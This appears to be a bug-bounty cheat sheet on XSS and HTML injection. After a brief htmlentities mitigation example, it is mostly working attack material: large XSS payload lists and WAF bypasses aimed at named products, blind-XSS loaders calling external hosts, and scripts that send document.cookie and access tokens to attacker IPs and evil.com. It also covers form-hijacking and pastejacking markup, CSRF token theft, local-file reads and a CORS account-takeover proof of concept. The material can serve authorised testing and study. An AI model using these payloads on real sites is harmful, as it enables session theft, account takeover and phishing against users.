# XSS\_HTML Injection

> In the name of God, the Most Gracious, the Most Merciful

### What's XSS

XSS, or Cross-Site Scripting, is like a digital illusionist's trick on the web. It occurs when a malicious script is injected into a website, turning it into a stage for hackers. Imagine innocent user input as a Trojan horse, bringing in a hidden script that dances through the site, stealing sensitive information like a phantom in the digital shadows. XSS exploits the trust between websites and users, turning the virtual playground into a stage for unseen mischief. Guarding against this vulnerability is like installing a cybersecurity force field, protecting the online theater from unwanted script-kiddie performances.

### **Example For Vulnerable code**

```php
    <!DOCTYPE html>
    <html>
    <body>
    
    <?php
    $txt = "PHP";
    echo "I love $txt!";
    ?>
    
    </body>
    </html>
```

## Mitigation code

*   Use htmlentities() Function

    ```php
    <!DOCTYPE html>
    <html>
    <body>

    <?php
    $txt = '"><script>alert(0)</script>';
    echo htmlentities("I love $txt!");
    ?>

    </body>
    </html>
    ```
*   Examples for htmlentities()

    ```php
    <?php
    $str = "A 'quote' is <b>bold</b>";

    // Outputs: A 'quote' is &lt;b&gt;bold&lt;/b&gt;
    echo htmlentities($str);

    // Outputs: A &#039;quote&#039; is &lt;b&gt;bold&lt;/b&gt;
    echo htmlentities($str, ENT_QUOTES);
    ?>
    ```

### XSS & HTMLI Testing Methodology

#### [XSS Payload Schema](https://brutelogic.com.br/blog/xss-payload-scheme/)

* Basic Schema `<tag handler=code>`
* Advanced Final Schema Try to make you Payloads inspired by this schema this will help you to bypass filters/Bypasses `extra1<tag spacer1 extra2 spacer2 handler spacer3 = spacer4 code spacer5> extra3`
* [Filter Bypass Procedure](https://brutelogic.com.br/blog/filter-bypass-procedure/)

```python
#XSS vs WAF 
1) use <x & jump to event handler 
2) use onxxx=yyy & find number of x it accepts 
3) test them & change tag accordingly 
4) put js
```

#### 1) Find a reflection point

* use gau/waymore to grab all urls and pass them to kxss tool to test reflection `echo "domain.com" | gau | kxss | grep ">"`
* Do some Google or any seach engines dorking to find endpoints

```html
ext:php | ext:asp | ext:aspx | ext:jsp | ext:asp | ext:pl | ext:cfm | ext:py | ext:rb | ext:.html
```

* Navigate to website and try every single function and features with burp/ZAP logging the requests Testing every parameter for relection using Extenstions like "Reflector" or "Reflect"
* FUZZING parameters using "Param-Miner" and "Arjun and test their reflection

#### 2) Get HTML injection

* Payloads

```html
88<h1>POC for h0tak88r</h1>88  
%253Ch1%253EHTML%253C%252Fh1%253E  
<iframe id="if1" src="https://www.google.com"></iframe>  
&amp;lt;h1&amp;gt;HTML&amp;lt;/h1&amp;gt;  
&#60;h1&#62;HTML&#60;/h1&#62;  
---------  
<form method="GET">Username: <input type="text" name="username" value="" /> <br />Password: <input type="password" name="passwd" value="" /> <br /><input type="submit" name="submit" value="login" /></form>  
------------------  
<h1>!!</h1><br/><h2><p style=\"color:red;\">there is a new discount code of 80%. Take advantage of it now!</p><form action=\"https://url/\"><button type=\"submit\">Click Here</button></h2>
```

[**HTML Injection Exploitation/Escalation**](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)

* Open Redirect

```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<meta http-equiv="refresh" content="0; url=http://h0tak88r.github.io" />
```

* Setting a Cookie

```html
<meta http-equiv="Set-Cookie" Content="SESSID=1">
```

* [Portal Tag](https://research.securitum.com/security-analysis-of-portal-element/)

```html
<portal src='https://attacker-server?
```

* [PasteJacking Attack](https://freedium.cfd/https://corneacristian.medium.com/methods-to-exploit-html-injection-17b4254035e)

```html
	<html>  
	   <body>  
	      <span style="display: block; float: left;">Copy me<br> </span>  
	      <span style="display: block; float: left; background: transparent; color: transparent; white-space: no-wrap; overflow: hidden; width: 0px; height: 0px;"> ; *Your Command/Payload Here* </span>  
	      <span style="display: block; float: left;">    
	</span>  
	      <span style="display: block; white-space: no-wrap;"> </span>  
	      <span style="display: block; clear: both;"></span>  
	    </body>  
	</html>
```

* [Defacement](https://medium.com/@lamscun/how-do-i-change-htmli-from-low-to-critical-your-email-box-is-safe-e7171efd88fe)
* [HTML Injection to SSRF](https://faizannehal.medium.com/how-you-can-escalate-a-simple-html-injection-into-a-critical-ssrf-8cd754e1a114) `<iframe src=https://yourwebsite.com/redirect.php?link=file:///etc/passwd></iframe>`
* Stealing clear text secrets

```html
<img src='http://attacker.com/log.php?HTML= <meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text= <meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```

* Abuse CSS

```html
<style>@import//hackvertor.co.uk?
<table background='//your-collaborator-id.burpcollaborator.net?'
```

* Stealing Forms\
  Set a form header: `<form action='http://evil.com/log_steal'>` this will overwrite the next form header and all the data from the form will be sent to the attacker

```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```

* using noscript

```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```

#### 3) Get your event handler injected

* [Agnostic Event Handlers](https://brutelogic.com.br/blog/agnostic-event-handlers/)

> "When building XSS payloads, some javascript event handlers can be used regardless of the tag used and work on the 5 major browsers until date (Chrome, Firefox, IE/Edge, Safari and Opera) hence the term “agnostic”"

```html
<brute contenteditable onblur=alert(1)>lose focus!  
<brute onclick=alert(1)>click this!  
<brute oncopy=alert(1)>copy this!  
<brute oncontextmenu=alert(1)>right click this!  
<brute oncut=alert(1)>copy this!  
<brute ondblclick=alert(1)>double click this!  
<brute ondrag=alert(1)>drag this!  
<brute contenteditable onfocus=alert(1)>focus this!  
<brute contenteditable oninput=alert(1)>input here!  
<brute contenteditable onkeydown=alert(1)>press any key!  
<brute contenteditable onkeypress=alert(1)>press any key!  
<brute contenteditable onkeyup=alert(1)>press any key!  
<brute onmousedown=alert(1)>click this!  
<brute onmousemove=alert(1)>hover this!  
<brute onmouseout=alert(1)>hover this!  
<brute onmouseover=alert(1)>hover this!  
<brute onmouseup=alert(1)>click this!  
<brute contenteditable onpaste=alert(1)>paste here!  
<brute style=font-size:500px onmouseover=alert(1)>0000
```

* [Port Swigger Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

Brute Force Event Handlers

```html
onafterprint
onafterscriptexecute
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onauxclick
onbeforecopy
onbeforecut
onbeforeinput
onbeforeprint
onbeforescriptexecute
onbeforetoggle
onbeforeunload
onbegin
onblur
onbounce
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncontextmenu
oncopy
oncuechange
oncut
ondblclick
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onend
onended
onerror
onfinish
onfocus
onfocusin
onfocusout
onfullscreenchange
onhashchange
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onmozfullscreenchange
onpagehide
onpageshow
onpaste
onpause
onplay
onplaying
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onprogress
onratechange
onrepeat
onreset
onresize
onscroll
onscrollend
onsearch
onseeked
onseeking
onselect
onselectionchange
onselectstart
onshow
onstart
onsubmit
ontimeupdate
ontoggle
ontoggle(popover)
ontouchend
ontouchmove
ontouchstart
ontransitioncancel
ontransitionend
ontransitionrun
ontransitionstart
onunhandledrejection
onunload
onvolumechange
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkittransitionend
onwheel
```

* Didn't Work ? Try [XSS Without Event Handlers](https://brutelogic.com.br/blog/xss-without-event-handlers/)

```html
# href  
<a href=javascript:alert(1)>click  
<math><brute href=javascript:alert(1)>click  
----------------------------------------  
# Action  
<form action=javascript:alert(1)><input type=submit>  
<isindex action=javascript:alert(1) type=submit value=click>  
-----------------------  
# formaction
**<form><button formaction=javascript:alert(1)>click  
<form><input formaction=javascript:alert(1) type=submit value=click>  
<form><input formaction=javascript:alert(1) type=image value=click>  
<form><input formaction=javascript:alert(1) type=image src=http://brutelogic.com.br/webgun/img/youtube1.jpg>  
<isindex formaction=javascript:alert(1) type=submit value=click>  
---------------------------  
# data
**<object data=javascript:alert(1)>  
---------------------------------------------  
# srcdoc
<iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;>  
----------------------------------------------------  
# xlink:href
<svg><script xlink:href=data:,alert(1)></script>  
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click  
-------------------------------------------------  
# from
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26>
-------------------------------------------------
```

#### 4) Inject JS code

* h0tak88r XSS

```html
 "'-->aaaaa<h1 onclick=alert(1)>h0tak88r
"'--><h1 onmouseover="alert(88)" style="color: red;">h0tak88r</h1> 
"'--><input/onauxclick="[1].map(prompt)">
'"()&%<zzz><ScRiPt >alert('88')</ScRiPt>&
<img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
'"--><Body onbeforescriptexecute="[1].map(confirm)">
''"--><img src=x onODYSsyi=1 onerror=alert(document.cookie)>
'`><\x00img src=xxx:x onerror=javascript:alert(1)> 
"><button popovertarget=x>Click me</button> <input type="hidden" value="y" popover id=x onbeforetoggle=alert(document.cookie)>
script><svg/onload=prompt`{document.cookie}`>
```

* Blind XSS Get your blind XSS payloads from https://xss.report/ OR https://xsshunter.trufflesecurity.com/app/#/

```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL004U1pUOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
'"><script src=//xss.report/s/M8SZT8></script>
  "><script src="https://js.rip/l5j9hbki0b"></script>
  "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2w1ajloYmtpMGIiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
```

### Payload list

````html
# karem Payloads
'"><script>alert('karem')</script> 
'"><img src=1 onerror="alert('Karem')">
'"><img src=1 onkarem=1 onerror="alert('Karem')"> 
<script/src=//6a%2elv></script> 
'"></script><script>alert(document.cookie)</script> 
%27"accesskey="x" onclick="alert(document.cookie)" x=" 
"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS 
<details/open=/open/href=/data=;+ontoggle="(alert)(document.cookie)> 
"><iframe/src=javascript:alert%26%23x000000028%3b)> 
%22%3E%3Ciframe/src%3Djavascript%3Aalert%2526%2523x000000028%253b%29%3E%0A 
<svg onload=prompt%26%230000000040document.domain)> 
"'--<h1 onmouseover="alert('karem')" style="color: red;">karem</h1> 
"><button%20popovertarget=x>Click%20me</button>%20<input%20type="hidden"%20value="y"%20popover%20id=x%20onbeforetoggle=alert(document.cookie)> 
"><a href="javascript:alert('xss')">clickme</a>
<svg onload=prompt%26%230000000040document.domain)> 
'"><script>alert('karem')</script>@gmail.com 
%0Dalert`1`// 
"<script>alert</script>"@gmail.com 
"><img src=1 OnErRoR=alert('xss')> 
'"><script src=https://xss.report/c/karemelsqary74></script> 
"><svg/onload=alert.bind()(document.domain)> 
'`><\x00img src=xxx:x onerror=javascript:alert(1)> 
'"><<Svg/Only=1/OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>

# h0tak88r
<style>*{background-image:url('\\\\6A\\\\61\\\\76\\\\61\\\\73\\\\63\\\\72\\\\69\\\\70\\\\74\\\\3A\\\\61\\\\6C\\\\65\\\\72\\\\74\\\\28\\\\6C\\\\6F\\\\63\\\\61\\\\74\\\\69\\\\6F\\\\6E\\\\29')}</style>
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%63%72%69%70%74%3E
[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
"><input/onauxclick="[1].map(prompt)">
<img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
'"--><Body onbeforescriptexecute="[1].map(confirm)">
'-prompt.call(window, 'xss')-'
<svg+onload=innerHTML=URL,outerHTML=textContent>#&ltimg/src/onerror=alert(domain)&gt
<img src=x onVector=X-Vector onerror=alert(1)>
%2sscript%2ualert()%2s/script%2u
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
toString=\\\\u0061lert;window+' '
"'-->aaaaa<h1 onclick=alert(1)>test
<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
" onfocus="alert(1)" autofocus="
''"--><img src=x onODYSsyi=1 onerror=alert(document.cookie)>
"'--><img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>

# XSS in Markdown
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)

# XSS in SVG (short)
<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>

# Bypass word blacklist with code evaluation
eval('ale'+'rt(0)');
Function('ale'+'rt(1)')();
new Function`alert`6``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`alert(14)```;

# Data grabber for XSS
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>



# Quick Defense:
<input type="search" onsearch="aler\\\\u0074(1)">
<details ontoggle="aler\\\\u0074(1)">

# IMG_error
<img onerror="location='javascript:=lert(1)'" src="x">
<img onerror="location='javascript:%61lert(1)'" src="x">
<img onerror="location='javascript:\\x2561lert(1)'" src="x">
<img onerror="location='javascript:\\x255Cu0061lert(1)'" src="x" >

# Unicode + HTML
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>

# URL
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>

# Hex
<script>eval('\\\\x61lert(1)')</script>

# Only lowercase block
<sCRipT>alert(1)</sCRipT>

# Break regex
<script>%0aalert(1)</script>

# Recursive filters
<scr<script>ipt>alert(1)</scr</script>ipt>

# Inject anchor tag
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">

# Bypass whitespaces
<svg·onload=alert(1)>

# Brutelogic
\\'-alert(1)//
</script><svg onload=alert(1)>
<x contenteditable onblur=alert(1)>lose focus!

# Imperva Incapsula
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
<img/src="x"/onerror="[JS-F**K Payload]">
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\\\\ert\\\\`1\\\\``'>

# WebKnight
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

# F5 Big IP
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="[JS-F**k Payload]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">

# PHP-IDS
<svg+onload=+"[DATA]"
<svg+onload=+"aler%25%37%34(1)"

# Mod-Security
<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>

# Sucuri WAF
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4

# Akamai
1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
<SCr%00Ipt>confirm(1)</scR%00ipt>

# AngularJS
{{constructor.constructor(alert 1 )()}}

#html Sanitization Bypass
<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/

# Bypass ‘ ‘ ( ) 
<iframe/src=javascript:alert%26%23x000000028%3b%27hacked%27)>

# waf Bypass SVG
<svg><a xlink:href=?usemap=/*&#x26;#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;*/onmouseover=window.focus()//>Hover me</a></svg>
<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>

# XSS in email Section
admin1@example.com<script>alert('xss');</script> 
“><svg/onload=confirm(1)>”@x.y 
"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com 
["');alert('XSS');//"]@xyz.xxx 
"<svg/onload=alert(1)>"@gmail.com 
test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E

# XSS Bypass for Rich Text Editors
<</p>iframe src=javascript:alert()//
<a href="aaa:bbb">x</a>
<a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>
[Click on me to claim 100$ vouchers](<https://evil.com>) -> Hyperlink Injection

# XSS Reflected in JSON Format and “{}” Forbidden
test%2Aconsole.log(1337)//’;

# XSS Reflected in `<link>` OR `<input type=hidden>` attribute when add param
/?lol=h0tak88r’accesskey=’x’onclick=’alert(0)’ # But the Victim must click ALT+SHIFT+X

# [Jhaddix](https://github.com/R0X4R/D4rkXSS/blob/master/jhaddix.txt)
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
<<scr\\0ipt/src=http://xss.com/xss.js></script%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
' onmouseover=alert(/Black.Spook/)

# [RSnake](https://github.com/R0X4R/D4rkXSS/blob/master/rsnake.txt)
<SCRIPT>alert('XSS');</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>   

# [Mario](https://github.com/R0X4R/D4rkXSS/blob/master/mario.txt)
<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>

# Blind Xss
'"><script src=//xss.report/s/M8SZT8></script>
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL004U1pUOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
# Using Burp Collaborator
<https://medium.com/@jr.mayank1999/exploiting-blind-xss-with-burp-collaborator-client-fec38b5fc5e>
````

### **polyglots**

```jsx
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="<http://i.imgur.com/P8mL8.jpg>">
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()///</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
```

### XSS Exploitation

* Self XSS + CORS = ATO

```bash
https://notifybugme.medium.com/chaining-cors-by-reflected-xss-to-account-takeover-my-first-blog-5b4f12b43c70
1. Got self XSS ?
2. cat corstexturl.txt | CorsMe or cat corstexturl.txt | soru -u | anew |while read host do ; do curl -s — path-as-is — insecure -H “Origin: test.com” “$host” | grep -qs “Access-control-allow-origin: test.com” && echo “$host \\033[0;31m” cors Vulnerable;done
  3. So to exploit this CORS Misconfiguration we just need to replace the XSS payload alert(document.domain), with the following code:
  
  function cors() {  
  var xhttp = new XMLHttpRequest();  
  xhttp.onreadystatechange = function() {    
    if (this.status == 200) {    
    alert(this.responseText);     
    document.getElementById("demo").innerHTML = this.responseText;    
    }  
  };  
  xhttp.open("GET", "<https://www.attacker.com/api/account>", true);  
  xhttp.withCredentials = true;  
  xhttp.send();
  }
  cors();
  4. So here is the final POC
  https://test.attacker.com/patter.jsp?facct="><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.attacker.com/api/account",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
```

* Self XSS to ATO

```python
## convert self xss to reflected one
copy response in a file.html -> it will work
```

* XSS to ATO

```jsx
<script>
fetch('<https://BURP-COLLABORATOR-SUBDOMAIN>', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

```jsx
## Cookie stealing through xss
<https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py>
<https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md>
<script>var i=newImage;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
<img src=x onerror=this.src='<http://172.30.5.46:8888/?'+document.cookie;>>
<img src=x onerror="this.src='<http://172.30.5.46:8888/?'+document.cookie>; this.removeAttribute('onerror');">
```

* XSS to RCE

[https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/](https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/)

* XSS to LFI

```jsx
<script%00>
 x=new XMLHttpRequest;
 x.onload=function(){document.write(this.responseText)};
 x.open("GET","file:///etc/passwd");x.send();
 </script%00>

<script>	x=new XMLHttpRequest;	x.onload=function(){ document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>

<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
```

* XSS to SSRF

```python
<esi:include src="<http://yoursite.com/capture>" />
```

* XSS to CSRF
*   XSS to CSRF [https://link.medium.com/ct4S2BiJYwb](https://link.medium.com/ct4S2BiJYwb)

    POC : `https://vulnerable.site/profile.php?msg=<script src=’https://attacker.site/attacker/script.js’></script>`

```jsx
var csrfProtectedPage ='<https://vulnerable.site/profile.php>'
var csrfProtectedForm ='form'
//get valid token for current request
var html = get(csrfProtectedPage);
  document.getElementbyId(csrfProtectedForm);
var token = form.token.value;

//Build with valid token
document.body.innerHTML+='form id="myform"action="+csrfProtectedPage+"method="POST">'+'<input id="password"name="name"value="hacked">'+'</form>';

// Auto submit form
document.forms["myfor"].submit();
function get(url){
  var xmlHttp = new XMLHttpRequest();
  xamlHttp.open("GET", url.false);
  xmlHttp.send(null)
  return xmlHttp.responseText;
}
```

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
  var token = this.responseText.match(/name="csrf" value="(\\w+)"/)[1];
  var changeReq = new XMLHttpRequest();
  changeReq.open('post', '/my-account/change-email', true);
  changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

* XSS Via Header Injection

```jsx
hostheader: bing.com">script>alert(document.domain)</script><"
```

* XSS to Open Redirect

```jsx
## URL redirection through xss
document.location.href="<http://evil.com>"
```

* Phishing Via Iframe

```jsx
## phishing through xss - iframe injection
<iframe src="http://evil.com" height="100" width="100"></iframe>
```

* **Remote File Inclusion (RFI) to XSS**

```jsx
php?=http://brutelogic.com.br/poc.svg
```

* **File upload To XSS**

```jsx
file upload name XSS
upload a picture file, intercept it, change picturename.jpg to xss payload
```

* **XSS via SVG file**

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("h0tak88r XSS");
   </script>
</svg>
```

### DOM XSS

#### **Check for Dom-XSS in Swagger-UI**

* [https://github.com/doosec101/swagger\_scanner](https://github.com/doosec101/swagger\_scanner)
* configUrl=https://jumpy-floor.surge.sh/test.json
* ?url=https://jumpy-floor.surge.sh/test.yaml

#### [**DOM XSS using web messages**](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

**Example for Vulnerable Code**

```jsx
<script>
    window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

**Exploit**

```html
<iframe src="<https://target.com/>" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

* [**DOM XSS using web messages and a JavaScript URL**](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
* [**DOM XSS using web messages and `JSON.parse`**](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
* [**DOM-based cookie manipulation**](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
* [**Exploiting DOM clobbering to enable XSS**](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
* [**Clobbering DOM attributes to bypass HTML filters**](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

### Some Bypasses Techniques

* **XSS for `.JSON` endpoint \[ bypass (`.html`)and `WAF` ]**
  *   `“resource Type” : “silent:nonexitsting”` Function

      ![https://user-images.githubusercontent.com/108616378/219940178-c7988e77-c51a-4e79-add2-e0b192d92e02.png](https://user-images.githubusercontent.com/108616378/219940178-c7988e77-c51a-4e79-add2-e0b192d92e02.png)
  * Use `url-encoded` payload with .`htm` extension and `//` for break directory block too , So the server so the server didn’t understand my request fully
  * POC: `https://www.redacted.com/etc/designs/redacted.json//%3Csvg%20onload=alert(document.domain)%3E.html`
* **XSS in meta tag**
  * [XSS bypass using META tag in realestate.postnl.nl | by Prial Islam Khan | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308)
  *   A decade-old \`ResolveUrl XSS\` bug is still present in many [http://ASP.NET](https://t.co/fJYUdsk50c) apps. I randomly found this bug in a very famous app.  \
      Try in login pages, redirects, forms & dynamic URL construction (`~/images/`). Payload: `/(A(%22onerror='alert%60123%60'test))/`\
      Credits:  [https://x.com/nav1n0x/status/1799384973407031565](https://x.com/nav1n0x/status/1799384973407031565)

      <figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

### [Mind Map](https://xmind.ai/share/CTAMcPfH?xid=O720Am6q)

## Top XSS reports from HackerOne:

